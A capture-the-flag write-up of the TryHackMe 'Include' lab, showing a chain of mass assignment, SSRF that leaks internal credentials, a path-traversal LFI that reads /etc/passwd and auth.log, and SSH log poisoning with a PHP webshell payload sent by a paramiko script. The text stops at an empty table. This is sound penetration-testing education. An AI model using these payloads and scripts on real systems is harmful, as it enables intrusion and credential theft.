# TryHackMe — Include

**Platform:** TryHackMe
**Difficulty:** Medium
**Tags:** `LFI` `Mass Assignment` `SSRF` `Log Poisoning` `RCE`

**TL;DR:** Two web apps. The Node.js app on port 4000 falls to a Mass Assignment (`isAdmin=true`) which unlocks an admin panel; an SSRF there leaks internal-API credentials for the PHP app on port 50000. That app has an LFI in `profile.php?img=` — the `uploads/` prefix kills `php://` wrappers, so instead of filter chains I poison `auth.log` via a paramiko SSH "login" and get RCE through `include()`.

## Recon

### nmap

```sh
sudo nmap -p- -T4 include.thm                                   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-10 12:03 -0400  
Nmap scan report for include.thm (10.66.146.41)  
Host is up (0.16s latency).  
Not shown: 65527 closed tcp ports (reset)  
PORT      STATE SERVICE  
22/tcp    open  ssh  
25/tcp    open  smtp  
110/tcp   open  pop3  
143/tcp   open  imap  
993/tcp   open  imaps  
995/tcp   open  pop3s  
4000/tcp  open  remoteanything  
50000/tcp open  ibm-db2
```

### Full nmap ports recon

```sh
PORT      STATE SERVICE  VERSION  
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   3072 ca:12:58:71:6c:2c:13:d3:4e:ed:06:32:35:39:6d:94 (RSA)  
|   256 c1:47:c5:d1:21:65:ef:43:5f:fd:17:c0:cb:57:53:a8 (ECDSA)  
|_  256 d4:58:5f:b0:71:99:90:8b:a0:8b:9f:79:cb:dc:de:35 (ED25519)  
25/tcp    open  smtp     Postfix smtpd  
|_ssl-date: TLS randomness does not represent time  
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING  
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal  
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal  
| Not valid before: 2021-11-10T16:53:34  
|_Not valid after:  2031-11-08T16:53:34  
110/tcp   open  pop3     Dovecot pop3d  
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal  
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal  
| Not valid before: 2021-11-10T16:53:34  
|_Not valid after:  2031-11-08T16:53:34  
|_pop3-capabilities: CAPA SASL RESP-CODES AUTH-RESP-CODE PIPELINING UIDL STLS TOP  
143/tcp   open  imap     Dovecot imapd (Ubuntu)  
|_ssl-date: TLS randomness does not represent time  
|_imap-capabilities: listed LITERAL+ IMAP4rev1 more ID Pre-login SASL-IR IDLE LOGIN-REFERRALS OK STARTTLS post-login LOGINDISABLEDA0001 ENABLE capabilities have  
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal  
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal  
| Not valid before: 2021-11-10T16:53:34  
|_Not valid after:  2031-11-08T16:53:34  
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)  
|_imap-capabilities: listed LITERAL+ IMAP4rev1 more ID AUTH=LOGINA0001 SASL-IR IDLE ENABLE OK post-login capabilities Pre-login AUTH=PLAIN LOGIN-REFERRALS have  
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal  
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal  
| Not valid before: 2021-11-10T16:53:34  
|_Not valid after:  2031-11-08T16:53:34  
|_ssl-date: TLS randomness does not represent time  
995/tcp   open  ssl/pop3 Dovecot pop3d  
|_pop3-capabilities: CAPA SASL(PLAIN LOGIN) RESP-CODES AUTH-RESP-CODE PIPELINING UIDL USER TOP  
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal  
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal  
| Not valid before: 2021-11-10T16:53:34  
|_Not valid after:  2031-11-08T16:53:34  
|_ssl-date: TLS randomness does not represent time  
4000/tcp  open  http     Node.js (Express middleware)  
|_http-title: Sign In  
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))  
| http-cookie-flags:   
|   /:   
|     PHPSESSID:   
|_      httponly flag not set  
|_http-title: System Monitoring Portal  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Important:** on port 50000: `httponly flag not set`.

There are two web applications.

### http://include.thm:4000/

![[Screenshot_20261010_124602.png]]

First, let's test the login form for auth SQL injection — payloads taken from `https://github.com/swisskyrepo/PayloadsAllTheThings`:

```sh
Auth_Bypass2.txt  
Auth_Bypass.txt
```

![[Screenshot_20261010_132429.png]]

No SQL injection in the login. Digging further.

```sh
ffuf -u 'http://include.thm:4000/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100

#                       [Status: 200, Size: 1295, Words: 366, Lines: 41, Duration: 309ms]  
                       [Status: 200, Size: 1295, Words: 366, Lines: 41, Duration: 309ms]  
index                   [Status: 302, Size: 29, Words: 4, Lines: 1, Duration: 313ms]  
# on at least 2 different hosts [Status: 200, Size: 1295, Words: 366, Lines: 41, Duration: 313ms]  
signup                  [Status: 500, Size: 1246, Words: 55, Lines: 11, Duration: 164ms]  
Index                   [Status: 302, Size: 29, Words: 4, Lines: 1, Duration: 205ms]  
signin                  [Status: 200, Size: 1295, Words: 366, Lines: 41, Duration: 154ms]  
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 176ms]  
INDEX                   [Status: 302, Size: 29, Words: 4, Lines: 1, Duration: 159ms]  
Signup                  [Status: 500, Size: 1246, Words: 55, Lines: 11, Duration: 150ms]  
SignUp                  [Status: 500, Size: 1246, Words: 55, Lines: 11, Duration: 149ms]  
signUp                  [Status: 500, Size: 1246, Words: 55, Lines: 11, Duration: 167ms]  
SignIn                  [Status: 200, Size: 1295, Words: 366, Lines: 41, Duration: 150ms]  
                       [Status: 200, Size: 1295, Words: 366, Lines: 41, Duration: 161ms]  
:: Progress: [220559/220559] :: Job [1/1] :: 607 req/sec :: Duration: [0:07:07] :: Errors: 0 ::
```

Nothing interesting here. Moving on.

Logged in as guest/guest:

```http
POST /signin HTTP/1.1
Host: include.thm:4000
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://include.thm:4000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apdf,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://include.thm:4000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=1nlubbsb2ii8a8fgjivbt420ig; connect.sid=s%3A6h1xft5eSFiGYeZZRSz6jFUHTkHj64dZ.8eCoIkeNiMSAbGva580vBuO96DJ%2BjrvrvrPG4yrzMxM

name=guest&password=guest
```

```http
HTTP/1.1 302 Found
X-Powered-By: Express
Location: /index
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 56
Date: Sat, 10 Oct 2026 17:36:31 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<p>Found. Redirecting to <a href="/index">/index</a></p>
```

```http
GET /index HTTP/1.1
Host: include.thm:4000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apdf,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://include.thm:4000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=1nlubbsb2ii8a8fgjivbt420ig; connect.sid=s%3A6h1xft5eSFiGYeZZRSz6jFUHTkHj64dZ.8eCoIkeNiMSAbGva580vBuO96DJ%2BjrvrvrPG4yrzMxM


```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 8987
ETag: W/"231b-kdqq/BtW6p7fLpBi99DRHqmAuOI"
Date: Sat, 10 Oct 2026 17:36:32 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

![[Screenshot_20261010_133828.png]]

Opening my profile:

```http
GET /friend/1 HTTP/1.1
Host: include.thm:4000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apdf,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://include.thm:4000/index
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AWyectM8SjOL6dUWjwZOZ0pQZFBIITgUt.YUJIeNkrf67oI7h74DETBXYU1oSIRgl6MvSmfg3v4JE
If-None-Match: W/"37be-55gspjLFc/jxUAE7Yj/X2UJfrTY"


```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 13910
ETag: W/"3656-CN/F0a0J0FpOBaviJRlgaUoC8ac"
Date: Sat, 10 Oct 2026 18:00:04 GMT
Connection: keep-alive
Keep-Alive: timeout=5


```

What we have here:

A profile with fields and descriptions.

![[Screenshot_20261010_140258.png]]

There is also a button to add a new field with a new value ![[Screenshot_20261010_140314.png]]

Let's first test simply adding a new field — and see where the request actually goes.

Sending:

```http
POST /recommend-activity/1 HTTP/1.1
Host: include.thm:4000
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://include.thm:4000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apdf,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://include.thm:4000/friend/1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AWyectM8SjOL6dUWjwZOZ0pQZFBIITgUt.YUJIeNkrf67oI7h74DETBXYU1oSIRgl6MvSmfg3v4JE

activityType=Favorite+Book&activityName=1984
```

![[Screenshot_20261010_141646.png]]

The new field was added. Now let's try changing it — send

```
Favorite Book: War and Peace
```

and see whether it updates the existing field.

```http
POST /recommend-activity/1 HTTP/1.1
Host: include.thm:4000
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://include.thm:4000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apdf,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://include.thm:4000/friend/1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AWyectM8SjOL6dUWjwZOZ0pQZFBIITgUt.YUJIeNkrf67oI7h74DETBXYU1oSIRgl6MvSmfg3v4JE

activityType=Favorite+Book&activityName=War%20and%20Peace
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 14117
ETag: W/"3725-+vD9IAfkS/lyS8zQCjOep/KgMX0"
Date: Sat, 10 Oct 2026 18:21:53 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

![[Screenshot_20261010_142108.png]]

Success. Now let's try overwriting the `isAdmin` field.

![[Screenshot_20261010_142218.png]]

```http
POST /recommend-activity/1 HTTP/1.1
Host: include.thm:4000
Content-Length: 38
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://include.thm:4000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apdf,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://include.thm:4000/friend/1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AWyectM8SjOL6dUWjwZOZ0pQZFBIITgUt.YUJIeNkrf67oI7h74DETBXYU1oSIRgl6MvSmfg3v4JE

activityType=isAdmin&activityName=true
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 14276
ETag: W/"37c4-Si33fHMLmVg55h50f0PZTfRwwyY"
Date: Sat, 10 Oct 2026 18:27:33 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

Success. Now let's check whether the privileges actually escalated.

![[Screenshot_20261010_142822.png]]

![[Screenshot_20261010_143053.png]]

It worked — privileges escalated.

This is a **Mass Assignment** vulnerability. The backend blindly binds the incoming `activityType`/`activityName` to fields of the profile object and saves them without an allow-list. I slipped in the "service" field `isAdmin`, and the object accepted it — that's mass assignment.

Now I have access to pages like `API` and `Settings`.

```http
Host: include.thm:4000
Content-Length: 54
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://include.thm:4000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apdf,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://include.thm:4000/friend/1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AWyectM8SjOL6dUWjwZOZ0pQZFBIITgUt.YUJIeNkrf67oI7h74DETBXYU1oSIRgl6MvSmfg3v4JE

activityType=profileImage&activityName=%2Fetc%2Fpasswd
```

No LFI this way — it only becomes a client-side img src. For now, keep exploring the admin panel.

```html
<h1>
                guest
            </h1>
            <p>I'm a Web Developer</p>
        </div>
        <div class="profile">
            <img src="/etc/passwd" alt="guest's profile image">
        </div> 

```

```http
GET /etc/passwd HTTP/1.1
Host: include.thm:4000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apdf,image/svg+xml,image/*,*/*;q=0.8
Referer: http://include.thm:4000/friend/1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AWyectM8SjOL6dUWjwZOZ0pQZFBIITgUt.YUJIeNkrf67oI7h74DETBXYU1oSIRgl6MvSmfg3v4JE


```

```http
HTTP/1.1 404 Not Found
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 149
Date: Sat, 10 Oct 2026 18:43:30 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

![[Screenshot_20261010_144948.png]]

It loads straight from an external service. Clearly something can be done with this — it looks a lot like SSRF, especially looking at the API page.

![[Screenshot_20261010_145417.png]]

```
- Internal API
    
    GET http://127.0.0.1:5000/internal-api HTTP/1.1
    Host: 127.0.0.1:5000
    
    Response:
    {
      "secretKey": "superSecretKey123",
      "confidentialInfo": "This is very confidential."
    }
```

```
- Get Admins API
    
    GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
    Host: 127.0.0.1:5000
    
    Response:
    {
        "ReviewAppUsername": "admin",
        "ReviewAppPassword": "xxxxxx",
        "SysMonAppUsername": "administrator",
        "SysMonAppPassword": "xxxxxxxxx",
    }
```

After updating the **Admin settings**

with this payload: `http://127.0.0.1:5000/internal-api HTTP/1.1`

![[Screenshot_20261010_145833.png]]

```
eyJzZWNyZXRLZXkiOiJzdXBlclNlY3JldEtleTEyMyIsImNvbmZpZGVudGlhbEluZm8iOiJUaGlzIGlzIHZlcnkgY29uZmlkZW50aWFsIGluZm9ybWF0aW9uLiBIYW5kbGUgd2l0aCBjYXJlLiJ9
```

Decoded:

```json
{"secretKey":"superSecretKey123","confidentialInfo":"This is very confidential information. Handle with care."}
```

Second request: `http://127.0.0.1:5000/getAllAdmins101099991`

![[Screenshot_20261010_150715.png]]

```
eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=
```

```json
{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
```

Excellent — got credentials for the second service at http://include.thm:50000/index.php

So here's the attack chain taking shape:

1. **Mass Assignment → Privilege Escalation** — `activityType=isAdmin&activityName=true`, as shown above.
2. **SSRF** — the `profileImage` field makes the server fetch a URL itself. Evidence:
	- the `activityName` key accepts a URL, not a path (`/etc/passwd` locally → 404, because it's a client-side img src);
	- the admin API page explicitly describes the internal service at `127.0.0.1:5000`;
	- by supplying `http://127.0.0.1:5000/internal-api` I received the internal response body in base64 (the server treats the fetched data as an image). That's the SSRF signature.

### http://include.thm:50000/index.php

![[Screenshot_20261010_124427.png]]

Entered the creds:

```json
{"SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
```

And got access to the admin panel.

![[Screenshot_20261010_151749.png]]

```html
|   |
|---|
|<div class="container-fluid">|
|<div class="row">|
|<div class="col-md-2 sidebar d-flex flex-column align-items-center py-4">|
|<img src="[profile.php?img=profile.png](http://include.thm:50000/profile.php?img=profile.png)" class="img-fluid rounded-circle mb-3 profile-pic" alt="User Profile Picture">|
|<h6>Welcome, administrator!</h6>|
|<p>Welcome to your dashboard!</p>

|</div>|
```

![[Screenshot_20261010_161144.png]]

I think this is where the LFI is. Let's verify.

Fuzzing for LFI automatically with `ffuf`.

```sh
ffuf -u 'http://include.thm:50000/profile.php?img=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt  -b "connect.sid=s%3AqLX8oPBaEro5sGnq-gtoF-O-sbrQDevk.%  
2BsiJOD3sB5Qd05vW6ZR5wV%2BrCLEsci7pWLX55TQZQ%2Fw; PHPSESSID=6gn9342hhrenn2qdr0vnoqktpb" -fs 0
```

Results:

```sh
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Line  
s: 42, Duration: 139ms]  
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 223  
1, Words: 20, Lines: 42, Duration: 140ms]  
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20  
, Lines: 42, Duration: 140ms]  
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Wor  
ds: 20, Lines: 42, Duration: 140ms]  
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Durat  
ion: 138ms]  
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 138ms]  
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 130ms]  
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 131ms]  
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 1  
35ms]  
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 136ms]  
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 136ms]  
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 136ms]  
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 137ms]  
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 136ms]  
:: Progress: [930/930] :: Job [1/1] :: 275 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

![[Screenshot_20261010_153820.png]]

![[Screenshot_20261010_153849.png]]

Tried everything: php.ini and config.php return 500.

Tried session poisoning (didn't work).

```
http://include.thm:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/lib/php/sessions/sess_socr9mtfnk5o5diplth92cu9nu
```

Yes, I can read PHP session files.

![[Screenshot_20261010_202344.png]]

Most likely `php:// filter` is simply being filtered/stripped. I'll look for other bypasses.

Interesting leads worth checking later:

```sh
curl -s -i 'http://include.thm:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/www/html/profile.php' \  
 -b 'PHPSESSID=71jun9t005lp7ctihlleee7nk2; connect.sid=s%3A6DItZkFuKVoKEEjsScnE7STlaR8KYzsw.BSEPzytjou9%2BAXbYD8tGHSOqdwJY3Xn2r9bB5adPfZE'  
HTTP/1.0 500 Internal Server Error  
Date: Tue, 13 Oct 2026 21:31:27 GMT  
Server: Apache/2.4.41 (Ubuntu)  
Expires: Thu, 19 Nov 1981 08:52:00 GMT  
Cache-Control: no-store, no-cache, must-revalidate  
Pragma: no-cache  
Content-Length: 0  
Connection: close  
Content-Type: text/html; charset=UTF-8
```

```sh
curl -s -i 'http://include.thm:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/php/7.4/apache2/php.ini' -b  
'PHPSESSID=71jun9t005lp7ctihlleee7nk2; connect.sid=s%3A6DItZkFuKVoKEEjsScnE7STlaR8KYzsw.BSEPzytjou9%2BAXbYD8tGHSOqdwJY3Xn2r9bB5adPfZE'     
HTTP/1.0 500 Internal Server Error  
Date: Tue, 13 Oct 2026 21:34:24 GMT  
Server: Apache/2.4.41 (Ubuntu)  
Expires: Thu, 19 Nov 1981 08:52:00 GMT  
Cache-Control: no-store, no-cache, must-revalidate  
Pragma: no-cache  
Content-Length: 0  
Connection: close  
Content-Type: text/html; charset=UTF-8
```

```sh
curl -s -i 'http://include.thm:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/php/7.1/apache2/php.ini' -b  
'PHPSESSID=71jun9t005lp7ctihlleee7nk2; connect.sid=s%3A6DItZkFuKVoKEEjsScnE7STlaR8KYzsw.BSEPzytjou9%2BAXbYD8tGHSOqdwJY3Xn2r9bB5adPfZE'  
HTTP/1.1 200 OK  
Date: Tue, 13 Oct 2026 21:34:43 GMT  
Server: Apache/2.4.41 (Ubuntu)  
Expires: Thu, 19 Nov 1981 08:52:00 GMT  
Cache-Control: no-store, no-cache, must-revalidate  
Pragma: no-cache  
Content-Length: 0  
Connection: close  
Content-Type: text/html; charset=UTF-8
```

I can read the SSH log (auth.log):

```sh
curl -s -i 'http://include.thm:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/auth.log' -b 'PHPSESSID  
=gam6886d3qf8p51sj2r615acob;'   
HTTP/1.1 200 OK  
Date: Sat, 24 Oct 2026 21:43:07 GMT  
Server: Apache/2.4.41 (Ubuntu)  
Expires: Thu, 19 Nov 1981 08:52:00 GMT  
Cache-Control: no-store, no-cache, must-revalidate  
Pragma: no-cache  
Vary: Accept-Encoding  
Content-Length: 1845  
Content-Type: text/html; charset=UTF-8  
  
Oct 24 19:09:01 ip-10-64-191-19 CRON[2277]: pam_unix(cron:session): session opened for user root by (uid=0)  
Oct 24 19:09:01 ip-10-64-191-19 CRON[2277]: pam_unix(cron:session): session closed for user root  
Oct 24 19:17:01 ip-10-64-191-19 CRON[2425]: pam_unix(cron:session): session opened for user root by (uid=0)  
Oct 24 19:17:01 ip-10-64-191-19 CRON[2425]: pam_unix(cron:session): session closed for user root  
Oct 24 19:39:01 ip-10-64-191-19 CRON[2522]: pam_unix(cron:session): session opened for user root by (uid=0)  
Oct 24 19:39:01 ip-10-64-191-19 CRON[2522]: pam_unix(cron:session): session closed for user root  
Oct 24 20:09:01 ip-10-64-191-19 CRON[2660]: pam_unix(cron:session): session opened for user root by (uid=0)  
Oct 24 20:09:01 ip-10-64-191-19 CRON[2660]: pam_unix(cron:session): session closed for user root  
Oct 24 20:17:01 ip-10-64-191-19 CRON[2729]: pam_unix(cron:session): session opened for user root by (uid=0)  
Oct 24 20:17:01 ip-10-64-191-19 CRON[2729]: pam_unix(cron:session): session closed for user root  
Oct 24 20:39:01 ip-10-64-191-19 CRON[2766]: pam_unix(cron:session): session opened for user root by (uid=0)  
Oct 24 20:39:01 ip-10-64-191-19 CRON[2766]: pam_unix(cron:session): session closed for user root  
Oct 24 21:09:01 ip-10-64-191-19 CRON[2868]: pam_unix(cron:session): session opened for user root by (uid=0)  
Oct 24 21:09:01 ip-10-64-191-19 CRON[2868]: pam_unix(cron:session): session closed for user root  
Oct 24 21:17:01 ip-10-64-191-19 CRON[2938]: pam_unix(cron:session): session opened for user root by (uid=0)  
Oct 24 21:17:01 ip-10-64-191-19 CRON[2938]: pam_unix(cron:session): session closed for user root  
Oct 24 21:39:01 ip-10-64-191-19 CRON[3174]: pam_unix(cron:session): session opened for user root by (uid=0)  
Oct 24 21:39:01 ip-10-64-191-19 CRON[3174]: pam_unix(cron:session): session closed for user root
```

## Trying to read source code (php://filter)

### 1. php://filter via profile.php?img= (port 50000)

| # | Request (img=...) | Result | Takeaway |
| --- | --- | --- | --- |
| 1 | `php://filter/convert.base64-encode/resource=/etc/passwd` | 200, `{}` | include failed → app fallback; no base64 |
| 2 | `php://filter/convert.base64-encode\|resource=file://<TRAVERSAL>/etc/passwd` | 200, 2231 bytes = raw passwd | filter NOT applied: the sanitizer eats the wrapper prefix, a clean traversal reaches include |
| 3 | `php://filter/convert.base64-encode/resource=<TRAVERSAL>/var/www/html/dashboard.php` | 200, rendered HTML (2668 B) | dashboard.php EXECUTED instead of being returned as text → include() confirmed; again no base64 |
| 4 | Full chain from php_filter_chain_generator.py (`<?php phpinfo(); ?>`, resource=php://temp) | 200, `{}` | chain dead for the same reason |
| 5 | Bypass matrix: `pHp://Filter`, `%70hp://`, double `resource=`, `Xresource=`, `read=`, `file://localhost` — with traversal inside resource | no base64 in any variant | the sanitizer re-glues/mangles the input before it reaches PHP; a direct wrapper never passes |

![[Screenshot_20261031_102750.png]]

![[Screenshot_20261031_102803.png]]

![[Screenshot_20261031_102819.png]]

In the end I got RCE via SSH poisoning. One important gotcha: recent OpenSSH builds reject special characters in the username, so the stock ssh client never even reached the login stage and just errored out.

![[Screenshot_20261101_191515.png]]

I had an LLM generate a script using paramiko that let me write the payload into the log.

```python
import argparse, socket  
import paramiko  
  
CANDIDATES = [  
   '<?php system($_GET[0]); ?>'       
]  
  
p = argparse.ArgumentParser()  
p.add_argument('--host', default='include.thm')  
args = p.parse_args()  
h = args.host  
  
for c in CANDIDATES:  
   assert c.count('<?php') == 1 and c.count('?>') == 1, f'payload unbalanced: {c}'  
   s = socket.create_connection((h, 22), timeout=10)  
   t = paramiko.Transport(s)  
   t.start_client(timeout=10)  
   try:  
      t.auth_password(c, 'x')   # AUTH-FAIL will be logged in the auth.log  
   except paramiko.AuthenticationException:  
      pass  
   finally:  
      t.close()  
   print('sent:', c)  
  
print('Success!')
```

![[Screenshot_20261101_191725.png]]

First I'll read the source code, then try a reverse shell.

`profile.php`

```php
<?php
session_start();

if (!isset($_SESSION['username'])) {
    header('Location: login.php');
    exit();
}

if(!empty($_GET['img'])){
    $file = $_GET['img'];
    $file = str_replace('../', '', $file);

    $file = preg_replace('/\.\.\//', '', $file, 5);
    $filePath = 'uploads/' . $file;

    if (strpos($filePath, 'uploads/') === 0) {
        @include($filePath);
    }
} else {
    echo "No data received.";
}
?>
```

![[Screenshot_20261101_192036.png]]

Now it's clear: `php://` can never work here. This script always prepends `uploads/` — that's what killed everything. Hence the filter attacks never worked.

Nothing interesting in `dashboard.php` — just a script mixed with HTML and template inserts.

![[Screenshot_20261101_192533.png]]

Uploading a reverse shell and checking what's up with php.ini — why I couldn't read it via LFI.

![[Screenshot_20261101_192941.png]]

Reverse shell obtained.

![[Screenshot_20261101_194343.png]]

Now it's clear why php.ini returned a 500 when read via LFI.

Because `include()` compiled the `<?php` and `?>` tags — the interpreter tried to execute them and died with a parse error.

![[Screenshot_20261101_195036.png]]

More precisely: php.ini line 178 (the comment for the `short_open_tag` directive) contains a literal `<?php` — for the INI parser that's a comment (`;`), but once the file goes through `include()` it is compiled as PHP source: everything before the first `<?php` is plain text, and after it PHP expects valid code — and the first token is a bare `and` → `Parse error: unexpected 'and'` → fatal → 500 with an empty body.

### What actually matters in this php.ini

| Directive | Value | Consequence |
| --- | --- | --- |
